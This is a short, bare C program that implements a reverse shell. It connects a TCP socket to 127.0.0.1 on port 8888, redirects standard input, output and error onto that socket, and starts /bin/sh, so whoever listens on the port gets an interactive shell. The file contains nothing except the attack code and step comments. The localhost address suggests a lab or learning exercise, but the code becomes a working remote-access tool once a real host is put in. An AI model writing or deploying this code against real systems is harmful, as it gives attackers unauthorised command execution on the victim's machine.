#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {
  // initialization
  struct sockaddr_in serv_addr;
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
  serv_addr.sin_port = htons(8888);

  // socket, open a socket
  int sock = socket(AF_INET, SOCK_STREAM, 0);

  // connect
  connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

  // return the stdin to client
  dup2(sock, 0);

  // return the stdout to client
  dup2(sock, 1);

  //return the stderr to client
  dup2(sock, 2);

  // execve open a shell
  execve("/bin/sh", NULL, NULL);
}
